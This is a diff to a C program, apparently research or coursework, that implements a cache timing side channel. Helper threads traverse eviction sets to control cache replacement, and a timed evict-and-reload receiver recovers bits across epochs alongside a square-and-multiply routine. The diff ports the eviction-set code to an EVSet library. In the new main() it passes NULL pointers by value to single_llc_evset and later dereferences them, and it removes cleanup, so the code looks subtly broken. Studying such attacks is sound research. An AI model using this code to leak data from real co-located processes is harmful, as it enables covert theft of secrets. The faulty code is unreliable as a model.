@@ -1,4 +1,4 @@
-#include "../inline_asm.h"
+// #include "../inline_asm.h"
 #include <assert.h>
 #include <ctype.h>
 #include <errno.h>
@@ -11,12 +11,13 @@
 #include <sys/mman.h>
 #include <sys/wait.h>
 #include <unistd.h>
-#include <x86intrin.h>
+// #include <x86intrin.h>
 #include <stdbool.h>
-#include candidate_set_linked_list.h
-#include find_eviction_set.h
+// #include find_eviction_set.h
+#include "cache/evset.h"
+#include "build_ev.h"
 
-#define PAGE_SIZE 4096
+#define CACHE_PAGE_SIZE 4096
 #define CACHE_LINE_SIZE 64
 #define NUM_PAGE_PER_ALLOC 5
 #define SYMBOL_CNT (1 << (sizeof(char) * 8))
@@ -68,7 +69,7 @@ uint64_t square_multiply(uint64_t b, uint64_t m, uint64_t e, int n) {
 void print_bin(uint64_t val){
 	int num_bits = sizeof(uint64_t) * 8;
 	for (int i = num_bits; i >= 0; i--){
-		printf("%llu", (val >> i) & 1);
+		printf("%lu", (val >> i) & 1);
 	}
 	printf("\n");
 }
@@ -114,20 +115,24 @@ void simple_side_channel_sender(uint64_t start_tsc, uint64_t msg_len, uint8_t *p
     }
 }
 
-void attack_helper(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd){
+void attack_helper(uint64_t start_tsc, uint64_t msg_len, EVSet *EVtd){
 	// The helper threads continuously load pages in the EV so they are in shared, to control the replacement policy
 
 	// stop the helper after a certain number of epochs
 	uint64_t end_tsc = start_tsc + (EPOCH_LENGTH * (msg_len + 1));
+	EVTestConfig *tconf = &EVtd->config->test_config;
+	size_t cnt = EVtd->size;
+	u8 **cands = EVtd->addrs;
 	while (_rdtsc() < end_tsc){
-		for (int i = 0; i < WTD; i++){
+		//for (int i = 0; i < WTD; i++){
 			// repeatedly access pages in the eviction set for the directory
-			_maccess(EVtd[i]);
-		}
+			//_maccess(EVtd[i]);
+		//}
+		tconf->traverse(cands, cnt, tconf);
 	}
 }
 
-void attacker_side_channel(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVl2_mul, uint64_t threshold, uint8_t *page_mul){
+void attacker_side_channel(uint64_t start_tsc, uint64_t msg_len, EVSet *EVl2_mul, uint64_t threshold, uint8_t *page_mul){
 
 	// setup handling incoming data
 	uint64_t recv_int = 0;
@@ -137,15 +142,20 @@ void attacker_side_channel(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVl2_
 	uint64_t next_evict = start_tsc;
 	uint64_t next_reload = start_tsc + 2 * EPOCH_LENGTH / 3;
 
+	EVTestConfig *tconf = &EVl2_mul->config->test_config;
+	size_t cnt = EVl2_mul->size;
+	u8 **cands = EVl2_mul->addrs;
+
 	//main receiver loop
 	for (uint64_t i = 0; i < msg_len; i++){
 		// evict
 		// TODO THE PAPER MENTIONS ACCESSING THESE 6 TIMES, WHY?
 		busy_wait_until(next_evict);
 		next_evict += EPOCH_LENGTH;
-		for (int j = 0; j < WL2; j ++){
-			_maccess(EVl2_mul[j]);
-		}
+		// for (int j = 0; j < WL2; j ++){
+		//	_maccess(EVl2_mul[j]);
+		// }
+		tconf->traverse(cands, cnt, tconf);
 
 		// wait for side channel transmission 
 		busy_wait_until(next_reload);
@@ -161,7 +171,7 @@ void attacker_side_channel(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVl2_
 		// Print the results
 		uint64_t now = _rdtsc();
 		uint64_t epoch_id = (now - start_tsc) / EPOCH_LENGTH;
-		printf("EPOCH: %" PRIu64 "; Receiving: '%d', latency: %llu \n", epoch_id, received_val, lat);
+		printf("EPOCH: %" PRIu64 "; Receiving: '%d', latency: %lu \n", epoch_id, received_val, lat);
 
 		// save results. Use mask to help
 		if (epoch_id < msg_len){
@@ -185,18 +195,18 @@ void attacker_side_channel(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVl2_
 int main(){
 	int ret = 0;
 	// make the memory regions take up multiple pages, so they should not co locate
-	uint8_t *page_sqr = mmap(NULL, PAGE_SIZE * NUM_PAGE_PER_ALLOC, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	uint8_t *page_mul = mmap(NULL, PAGE_SIZE * NUM_PAGE_PER_ALLOC, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	uint8_t *page_sqr = mmap(NULL, CACHE_PAGE_SIZE * NUM_PAGE_PER_ALLOC, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	uint8_t *page_mul = mmap(NULL, CACHE_PAGE_SIZE * NUM_PAGE_PER_ALLOC, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 
 	// allcoate pointers for the eviction sets
-	uint8_t **EVtd = calloc(WTD + 1, sizeof(uint8_t *));
-	uint8_t **EVl2_mul = calloc(WL2 + 1, sizeof(uint8_t *));
+	EVSet *EVtd = NULL;
+	EVSet *EVl2_mul = NULL;
 
 	// calibrate the latency
 	uint64_t threshold = calibrate_latency();
 
 	// generate the eviction sets
-	generate_ev(EVtd, EVl2_mul);
+	single_llc_evset(page_mul, EVl2_mul, EVtd);
 
 
 	// sizeof returns number of bytes in msg, so multiply by 8 to get the total number of bits
@@ -247,18 +257,10 @@ int main(){
 	}
 
 	cleanup:
-		munmap(page_sqr, PAGE_SIZE * NUM_PAGE_PER_ALLOC);
-		munmap(page_mul, PAGE_SIZE * NUM_PAGE_PER_ALLOC);
+		munmap(page_sqr, CACHE_PAGE_SIZE * NUM_PAGE_PER_ALLOC);
+		munmap(page_mul, CACHE_PAGE_SIZE * NUM_PAGE_PER_ALLOC);
 
-		// clean up the eviction sets, need to iterate through each
-		for (int i =0; i < WTD + 1; i++){
-			// TODO FREE EACH ITEM IN EVtd
-		}
-		for (int i =0; i < WL2 + 1; i++){
-			// TODO FREE EACH ITEM IN EVl2_mul
-		}
-		free(EVtd);
-		free(EVl2_mul);
+		
 		return ret;
 }
 
